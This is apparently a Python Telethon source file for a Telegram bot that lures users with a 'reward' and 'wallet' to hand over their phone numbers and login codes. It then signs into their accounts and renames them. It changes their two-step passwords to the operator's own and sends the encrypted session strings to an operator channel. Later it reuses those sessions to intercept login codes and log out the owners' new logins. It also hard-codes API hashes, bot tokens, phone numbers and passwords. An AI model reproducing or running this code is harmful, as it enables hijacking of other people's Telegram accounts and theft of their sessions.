import os
import asyncio
import time
import threading
import logging
import pprint
import crypter

try:
    from telethon.sessions import StringSession
    from telethon.sessions.string import StringSession
    from telethon.sync import TelegramClient, functions, events, Button
    from telethon.tl.functions.account import UpdateProfileRequest
    from telethon.tl.types import ReplyKeyboardMarkup, KeyboardButtonRequestPhone
    import telethon.tl.types
    from telethon import errors
    #import qrcode
    from qrcode import QRCode
except:
    os.system("pip install telethon")
    os.system("pip install qrcode")
    from telethon.sessions import StringSession
    from telethon.sessions.string import StringSession
    from telethon.sync import TelegramClient


# Replace with your API ID and API hash
api_id = '16017675'
api_hash = '898e9db01786302c9f95f67c23d9fecb'
botToken = '7678259114:AAEk9QF7FdxaN8MZ_9PN8SvYTswnigaPk3c' # buy-sell
#botToken = '7753879828:AAHcGFNikwY6clhpXJx345rgTlP6z9AvMUA' # master
#botToken = '7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4' # filercv

phn_m = "+8801772525830"
pswd = "542543"
p_2fa = "542543"

ssn_hash = {}
"""
qr = QRCode()

def pr_qr(url: str) -> None:
    qr.clear()
    qr.add_data(url)
    print("Scan the QR code via the app Telegram -> Settings -> Devices")
    qr.print_ascii()


def p_qr(url: str) -> None:
    # You can also use qrcode library to generate the QR code image
    img = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=4)
    img.add_data(url)
    img.make(fit=True)
    
    # Display the QR code (example: using PIL - install pillow: pip install Pillow)
    img.print_ascii() # For a simple text-based display
    #from PIL import Image
    #img.get_image_instance().save("qr_code.png")
    # # You would typically display qr_code.png in your GUI or web application
"""

async def disconnect_if_connected(client):
    """
    Disconnects the Telethon client if it is currently connected.
    """
    if client.is_connected():
        print("Client is connected. Disconnecting...")
        await client.disconnect()
        #print("Client disconnected.")
    else:
        print("Client is not connected.")


async def nm_2fa_save(mClient,sender_id,client,pass_2fa=None):
    me = await client.get_me()
    ssn = client.session.save()
    phn = me.phone

    f_name = phn[3:] + '__KSP'
        
    print(f'Logged in as {me.first_name} _ {me.phone}')
    # Update the first name
    try:
        await client(UpdateProfileRequest(first_name=f_name))
        print(f'First name changed to {me.first_name}')
            
    except Exception as e:
        print(f"An error occurred: {e}")


    result = await client(functions.account.GetPasswordRequest())

    if not result.has_password:
        print("no 2fa")
            
                
        try:
            await client.edit_2fa(new_password=p_2fa,hint='5****3')
            print("2FA has been successfully enabled.")
                
        except Exception as e:
            print(f"An error occurred: {e}")

    if result.has_password:
        print("has 2fa")
        await client.edit_2fa(pass_2fa)
        try:
            await client.edit_2fa(new_password=p_2fa,hint='5****3')
            print("2FA has been successfully enabled.")
                
        except Exception as e:
            print(f"An error occurred: {e}")
            
        
    print("\nSession sent in saved messages.")
    
    ssn = crypter.password_encrypt(ssn.encode(), 'KsP@542543')
    
    print(f"\n{ssn}\n\n")

    #ssn = ssn.replace("b'", "").replace("'", "")

    ssn = ssn.decode()
    
    print(f"\n{ssn}\n\n")
        
    await client.send_message("me", f"🔴 Don't share with anyone 🔴\n\n`{phn}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
    await mClient.send_message(2576914746, f"`{phn}_{sender_id}`\n\n`{ssn}`\n\n💁‍♂️ Developer @k_ofcl✌️",)
    

    #for message in mClient.get_messages(sender_id, None, search=phn):
        #print(message.text)

    #await mClient.delete_messages(entity=id_group, message_ids=[id_message])
    


    #await mClient.send_message(sender_id, phn + ' 🟢 Received Successfully')
    await mClient.send_message(sender_id, f' ✅ Congrats, the account {phn} has been verified successfully\nand reward amount has been added to your wallet')


    await disconnect_if_connected(client)
    print("\n\nKSP Finished.")


async def fetch_bal(meClient,sender_id):
    
    
    hn = await meClient.get_me() 
    print(str(hn.id) + ' ' + str(sender_id))

    all_nums = []
    all_u_nums = []
    all_v_nums = []
    for message in await meClient.get_messages(2576914746, None):
        #print(message)
        if (
            not hasattr(message.replies, 'MessageService') and
            message.replies and
            hasattr(message.replies, 'replies') and
            message.message.startswith("880") and
            str(sender_id) in message.message
        ):
            num = message.text.split('\n\n')[0].replace("`", "")
            num = num.split('_')[0]
            #print(num)
            all_nums.append(num)
            print(f"{str(len(all_nums))} all numbers found {str(num)}")
        if (
            not hasattr(message.replies, 'MessageService') and
            message.replies and
            hasattr(message.replies, 'replies') and
            message.replies.replies == 0 and
            message.message.startswith("880") and
            str(sender_id) in message.message
        ):
            num = message.text.split('\n\n')[0].replace("`", "")
            num = num.split('_')[0]
            #print(num)
            all_u_nums.append(num)
            print(f"{str(len(all_u_nums))} unverified numbers found {str(num)}")
        if (
            not hasattr(message.replies, 'MessageService') and
            message.replies and
            hasattr(message.replies, 'replies') and
            message.replies.replies == 1 and
            message.message.startswith("880") and
            str(sender_id) in message.message
        ):
            num = message.text.split('\n\n')[0].replace("`", "")
            num = num.split('_')[0]
            #print(num)
            all_v_nums.append(num)
            print(f"{str(len(all_v_nums))} verified numbers found {str(num)}")
    
    #await disconnect_if_connected(meClient)
    return [len(all_nums), len(all_u_nums), len(all_v_nums)]


async def login_otp_send(phn,mClient,client,msg):
    
    await client.connect()
    result = await client.send_code_request(phn)
    phone_code_hash = result.phone_code_hash

    ssn_str = client.session.save()
    
    await asyncio.sleep(2)

    ssn_hash[phn + '_ssn'] = ssn_str
    ssn_hash[phn + '_hash'] = phone_code_hash
    print(f"ssn+hash is stored : {phn}")
    #print(ssn_hash[phn + '_ssn'])
    #print(ssn_hash[phn + '_hash'])
    
    await mClient.edit_message(msg.peer_id.user_id, msg.id, phn + ' 🟣 Reply With OTP')
    


#🔴🟠🟡🟢🔵🟣🟤⚫⚪ represent red, orange, yellow, green, blue, purple, brown, black, and white circles

async def try_login_2fa(mClient,event,ssn_str,phn,code,p_c_hash,pass_2fa=None):
    
    client = TelegramClient(StringSession(ssn_str), api_id, api_hash)
    await client.connect()
    #code = input("Enter the verification code: ")  # Get the OTP from the user
    try:
        if pass_2fa is None:
            await client.sign_in(phn, code, phone_code_hash=p_c_hash)
        elif not pass_2fa is None:
            await client.sign_in(password=pass_2fa)

        if await client.is_user_authorized():
            
            print("User Authenticated...")

            await asyncio.sleep(2)
            phn_self = await client.get_me()
            print(phn_self.phone)
            
            await nm_2fa_save(mClient,event.sender_id,client,pass_2fa)
        

    except errors.SessionPasswordNeededError:
        if pass_2fa is None:
            await mClient.send_message(event.sender_id,
                f"{phn} 🟠 Enter 2FA"
            )
        await disconnect_if_connected(client)
            #await nm_2fa_save(bot,client)    
    except:
        pass

async def get_next_number_smart(meClient, event, sender_id, limit=20):
    """
    Try last messages first.
    If session dead → reply 'dead' on that message.
    """

    async for message in meClient.get_messages(2576914746, None):
        try:
            if (
                message.message and
                message.message.startswith("880") and
                str(sender_id) in message.message
            ):
                # skip already used
                if message.replies and message.replies.replies > 0:
                    continue

                num = message.text.split('\n\n')[0].replace("`", "").split('_')[0]
                ssn_enc = message.text.split('\n\n')[1].replace("`", "")

                # decrypt
                try:
                    ssn = crypter.password_decrypt(ssn_enc.encode(), 'KsP@542543').decode()
                except:
                    continue

                client = TelegramClient(StringSession(ssn), api_id, api_hash)

                try:
                    await client.connect()

                    if not await client.is_user_authorized():
                        # ❌ dead → reply mark
                        await meClient.send_message(
                            2576914746,
                            "❌ dead",
                            reply_to=message.id
                        )
                        await client.disconnect()
                        continue

                    await client.disconnect()
                    return num, ssn

                except:
                    # ❌ dead
                    """await meClient.send_message(
                        2576914746,
                        "❌ dead",
                        reply_to=message.id
                    )"""
                    continue

        except:
            continue

    return None, None


async def listen_login_only(client, event, phn):
    otp_received = False

    @client.on(events.NewMessage(incoming=True, chats=777000))
    async def handler(e):
        nonlocal otp_received

        # ✅ OTP phase
        if not otp_received and "Login code:" in e.raw_text:
            otp = e.raw_text.split("Login code: ")[1].split('.')[0]

            await event.respond(f"✅ `{phn}` OTP: `{otp}`")
            otp_received = True

            # 🔥 2FA disable
            try:
                result = await client(functions.account.GetPasswordRequest())
                if result.has_password:
                    await client.edit_2fa(current_password=p_2fa, new_password=None)
            except:
                pass

            return  # ⛔ stop OTP handling

        # ✅ AFTER OTP → detect new login
        if otp_received:
            if "logged in" in e.raw_text.lower() or "new login" in e.raw_text.lower():
                await event.respond(f"⚠️ New login detected → `{phn}` logout")

                await client.log_out()
                await client.disconnect()

async def process_next(meClient, event):
    sender_id = event.sender_id

    await event.respond("🔄 Getting number...")

    # step 1: fast
    phn, ssn = await get_next_number_smart(meClient, event, sender_id)

    # step 2: fallback full
    #if not phn:
        # phn, ssn = await get_next_number_full(meClient, event, sender_id)

    if not phn:
        await event.respond("❌ No numbers found")
        return

    await event.respond(f"📱 Using `{phn}`")

    client = TelegramClient(StringSession(ssn), api_id, api_hash)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            await process_next(meClient, event)  # retry next
            return

        await event.respond("⏳ Waiting OTP...")

        asyncio.create_task(listen_login_only(client, event, phn))

        await client.run_until_disconnected()

    except:
        try:
            await client.disconnect()
        except:
            pass

        await process_next(meClient, event)



async def get_otp(mClient,mEvent,phn):
    for message in await mClient.get_messages(2576914746, None):
    
        if (
            message.replies and
            hasattr(message.replies, 'replies') and
            message.message.startswith(phn)
        ):
            #senderUID = mClient.get_entity(message.from_id.user_id).username
            #if (senderUID):
            #print( f"{message.text}" )
            ssn = message.text.split('\n\n')[1].replace("`", "")
            print(ssn)
            ssn = crypter.password_decrypt(ssn.encode(), 'KsP@542543').decode()

            client = await TelegramClient(StringSession(ssn), api_id, api_hash).start(password='542543',max_attempts=10)
            cPhn = await client.get_me()
            
            print(f"Logged in as : {cPhn.phone}")

            @client.on(events.NewMessage(incoming=True, chats=777000))
            async def newMessage(event):
                if event.raw_text.startswith("Login code:"):
                    otp = event.raw_text.replace("Login code: ", "").split('.')[0]
                    #[0].isdigit()
                    print(str(event.chat_id) + ' : ' + otp)
                    result = await client(functions.account.GetPasswordRequest())

                    if not result.has_password:
                        print("no 2fa")
                    if result.has_password:
                        print("has 2fa")

                    #await client.send_message('@k_ofcl', otp)
                    time.sleep(3)
                    sender = await event.get_sender()
                    name = sender.first_name
                    await mEvent.respond(f'Hello\t\t**{name}!!**\nYour Otp Is `{otp}`')
                    await disconnect_if_connected(client)

            await client.run_until_disconnected()



async def login_bot():
    meClient = TelegramClient('me', api_id, api_hash)
    client = TelegramClient('bot.session', api_id, api_hash)

    await client.start(bot_token=botToken, max_attempts=10)
    await meClient.start(phone='+8801778855999', password="khALid@542543", max_attempts=10)

    # =========================
    # START COMMAND
    # =========================
    @client.on(events.NewMessage(pattern='/start'))
    async def start(event):
        sender = await event.get_sender()
        name = sender.first_name

        await event.respond(
            f"Hello\t\t**{name}!!**\n\n"
            "Welcome to OTP Bot ✅"
        )

    # =========================
    # /self COMMAND
    # =========================
    @client.on(events.NewMessage(pattern='/self'))
    async def self_command(event):
        sender = await event.get_sender()
        #button = KeyboardButton("📱 Share Phone Number", request_contact=True)
        #keyboard = ReplyKeyboardMarkup([[button]], resize=True, one_time_keyboard=True)
        button = KeyboardButtonRequestPhone(
            text="📱 Share Phone Number"
        )
        keyboard = ReplyKeyboardMarkup(
            [[button]],
            resize=True,
            single_use=True
        )
        
        await event.respond(
            "Please share your phone number 👇",
            buttons=keyboard
        )

    @client.on(events.NewMessage(func=lambda e: e.contact))
    async def contact_handler(event):
        phone = event.message.contact.phone_number
        sender = await event.get_sender()
        await event.respond(
            f"✅ Thanks {sender.first_name}!\n\n"
            f"Your number is: {phone}"
        )

    
    # =========================
    # OTP COMMAND
    # =========================
    @client.on(events.NewMessage(pattern=r'/otp (.+)'))
    async def otp_handler(event):
        msg = event.pattern_match.group(1).strip().lower()
        sender_id = event.sender_id

        print("OTP CMD:", msg)

        # =========================
        # ✅ CASE 1: /otp next
        # =========================
        if msg == "next":
            await process_next(meClient, event)
            return  # ⛔ stop here

        # =========================
        # ✅ CASE 2: manual number
        # =========================

        # normalize number
        if msg.startswith("1"):
            msg = '880' + msg
        elif msg.startswith("01"):
            msg = '88' + msg

        # =========================
        # ✅ VALIDATION
        # =========================
        if msg.startswith("8801") and len(msg) >= 13:
            await event.respond(f"📱 Using number: `{msg}`")
            await get_otp(meClient, event, msg)
        else:
            sender = await event.get_sender()
            name = sender.first_name

            await event.respond(
                f"Hello\t\t**{name}!!**\n\n"
                "❌ Invalid format\n\n"
                "✅ Use:\n"
                "`/otp 017xxxxxxxx`\n"
                "`/otp next`"
            )

    print("✅ Bot is running...")
    await client.run_until_disconnected()


    @client.on(events.NewMessage(pattern='/account'))
    async def start(event):
        sender = await event.get_sender()
        name = sender.first_name

        tot_acc = await fetch_bal(meClient,sender.id)

        print(f"{str(tot_acc[0])} {str(tot_acc[1])} {str(tot_acc[2])}")

        text_msg = f"""
🌟 Account Information 🌟
👤 Name : `{sender.first_name}`
🆔 User ID : `{sender.id}`
                    
📤 Number of verified accounts : `{str(tot_acc[2])}`
📤 Number of unverified accounts : `{str(tot_acc[1])}`
📤 Total accounts from the beginning : `{str(tot_acc[0])}`

💸 Balance that can be settled : `0.0$`

❄️ Time Now : `2025-05-01 12:11:54`
        """
    
        await event.reply(text_msg,
                      buttons=[
                          [Button.inline('💵 Withdraw', data='withdraw')],
                          [Button.inline('Withdrawal History', data='whistory')]
                      ])


        #await event.reply(text_msg,btns)


    @client.on(events.CallbackQuery(data='withdraw'))
    async def handler(event):
        
        text_msg = f"""
❗ Sorry, your account doesn't have enough balance at the moment.

💰 Our minimum withdrawal limit is at least 1 account..
        """

        await event.reply(text_msg)


    
    @client.on(events.CallbackQuery(data='whistory'))
    async def handler(event):
        await event.reply('not rdy yet!!')
        
    @client.on(events.NewMessage(pattern='/withdraw'))
    async def start(event):
        sender = await event.get_sender()
        name = sender.first_name

        text_msg = f"""
❗ Sorry, your account doesn't have enough balance at the moment.

💰 Our minimum withdrawal limit is at least 1 account..
        """

        await event.reply(text_msg)



    @client.on(events.NewMessage(pattern='/msg'))
    async def start(event):
        await event.respond('wait...')
        
        sss = await client.get_messages(event.sender_id, ids=41)
        print(sss)

    @client.on(events.NewMessage(func=lambda e: e.is_reply))
    async def replied(event):
        r_code = event.text.lower()
        
        #print(event.reply_to_msg_id)
        msg = await client.get_messages(event.sender_id, ids=event.reply_to_msg_id)
        msg = msg.text.lower()

        if str(msg).startswith('+880'):
            phn = msg.split(' ')[0]
            ssn_str = ssn_hash.get(f"{phn}_ssn")
            p_c_hash = ssn_hash.get(f"{phn}_hash")

            if not ssn_str is None and not p_c_hash is None:
                if 'otp' in msg and len(r_code) == 5 and r_code.isdigit():
                    await try_login_2fa(client,event,ssn_str,phn,r_code,p_c_hash)
                elif 'otp' in msg and not len(r_code) == 5 and not r_code.isdigit():
                    await client.send_message(event.sender_id,
                        f"{phn} 🔴 Invalid OTP"
                    )

                if '2fa' in msg:
                    await try_login_2fa(client,event,ssn_str,phn,r_code,p_c_hash,r_code)
                

        

        #print(f"{msg}\n\n")
        
        #if msg.startswith("+880"):
            #msg
        #await event.reply("Your feedback will be taken to HR!")

    @client.on(events.NewMessage(pattern='/food'))
    async def send_welcome(event):
        await client.send_message(event.sender_id,
            'What food do you like?',
            buttons=[
                Button.inline('Fruits', 'fruit'),
                Button.inline('Meat', 'meat')
            ]
        )

    @client.on(events.CallbackQuery(data='fruit'))
    async def handler(event):
        await client.edit_message(event.sender_id, event.message_id,
            'What fruits do you like?',
            buttons=[
                Button.inline('Apple', 'apple'),
                Button.inline('Pear', 'pear')
            ]
        )


    @client.on(events.NewMessage(pattern=r'^(\+8801|1|01)'))
    async def send_welcome(event):
        
        msg = event.text.lower()
        if msg.startswith("1"):
            msg = '+880' + msg
        elif msg.startswith("01"):
            msg = '+88' + msg
        
        msg_sent = await client.send_message(event.sender_id, msg + ' 🔵 In Progress')
        
        #await client.edit_message(msg_sent.peer_id.user_id, msg_sent.id, msg + ' 🔵 In Prog')
        
        uClient = TelegramClient(StringSession(), api_id, api_hash)
        await login_otp_send(msg,client,uClient,msg_sent)
        #await disconnect_if_connected(uClient)

        
        #code = input("Enter the verification code: ")  # Get the OTP from the user

        

        
        #await disconnect_if_connected(client)

        



    @client.on(events.CallbackQuery(data='fruit'))
    async def handler(event):
        await client.edit_message(event.sender_id, event.message_id,
            'What fruits do you like?',
            buttons=[
                Button.inline('Apple', 'apple'),
                Button.inline('Pear', 'pear')
            ]
        )




    # Handler for the /help command
    @client.on(events.NewMessage(pattern='/help'))
    async def help(event):
        help_text = (
            "Here are the commands you can use:\n"
            "/start - Start the bot\n"
            "/help - Get help information\n"
            "/info - Get information about the bot\n"
            "/echo <message> - Echo back the message\n"
        )
        await event.respond(help_text)
        logging.info(f'Help command received from {event.sender_id}')

    # Handler for the /info command
    @client.on(events.NewMessage(pattern='/info'))
    async def info(event):
        await event.respond('This bot is created using Telethon in Python. It can respond to various commands and messages.')
        logging.info(f'Info command received from {event.sender_id}')

    # Handler for the /echo command
    @client.on(events.NewMessage(pattern='/echo (.+)'))
    async def echo(event):
        message = event.pattern_match.group(1)
        await event.respond(f'Echo: {message}')
        logging.info(f'Echo command received from {event.sender_id} with message: {message}')

    # Keyword-based response handler
    @client.on(events.NewMessage)
    async def keyword_responder(event):
        message = event.text.lower()

        responses = {
            'hello': 'Hi there! How can I help you today?',
            'how are you': 'I am just a bot, but I am here to assist you!',
            'what is your name': 'I am MyAwesomeBot, your friendly Telegram assistant.',
            'bye': 'Goodbye! Have a great day!',
            'time': 'I cannot tell the current time, but you can check your device!',
            'date': 'I cannot provide the current date, but your device surely can!',
            'weather': 'I cannot check the weather, but there are many apps that can help you with that!',
            'thank you': 'You are welcome!',
            'help me': 'Sure! What do you need help with?',
            'good morning': 'Good morning! I hope you have a great day!',
            'good night': 'Good night! Sweet dreams!',
            'who created you': 'I was created by a developer using the Telethon library in Python.',
        }


        
        reses = {
            '/start': '',
            '/info': '',
            '/help': '',
            '/echo': '',
        }

        response = responses.get(message, None)
        rese = reses.get(message, None)

        if response:
            await event.respond(response)
        elif not rese:
            pass
        else:
            # Default response
            default_response = (
                "I didn't understand that command. Here are some commands you can try:\n"
                "/start - Start the bot\n"
                "/help - Get help information\n"
                "/info - Get information about the bot\n"
                "/echo <message> - Echo back the message\n"
            )
            #await event.respond(default_response)
            
        logging.info(f'Message received from {event.sender_id}: {event.text}')


    await client.run_until_disconnected()
        

async def login_main():

    while True:
        bot = TelegramClient(StringSession(), api_id, api_hash)
        await bot.start(bot_token=botToken,max_attempts=10)

        @bot.on(events.NewMessage(incoming=True, chats=777000))
        async def newMessage(event):
            if event.raw_text.startswith("+880"):
                event.replay('proccessing...')
                await client.disconnected()

        client.run_until_disconnected()


        
        client = TelegramClient(StringSession(), api_id, api_hash)
        await client.connect()
        phone_number = "+880" + input("Enter the phone number: ")
        result = await client.send_code_request(phone_number)
        phone_code_hash = result.phone_code_hash
        
        code = input("Enter the verification code: ")  # Get the OTP from the user

        
        
        try:
            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
            if client.is_connected():
                await nm_2fa_save(bot,client)

        except errors.SessionPasswordNeededError:
            await client.sign_in(password=pass_2fa)
            if await client.is_connected():
                await nm_2fa_save(bot,client)
            pass
        
        except:
            pass

        await asyncio.sleep(10)  # Sleep for 60 seconds (1 minute)
        await disconnect_if_connected(client)
        await disconnect_if_connected(bot)
        os.system('cls')
        #time.sleep(5)
    
#telethon.errors.rpcerrorlist.PhoneCodeExpiredError: The confirmation code has expired (caused by SignInRequest
if __name__ == "__main__":
    
    asyncio.run(login_bot())
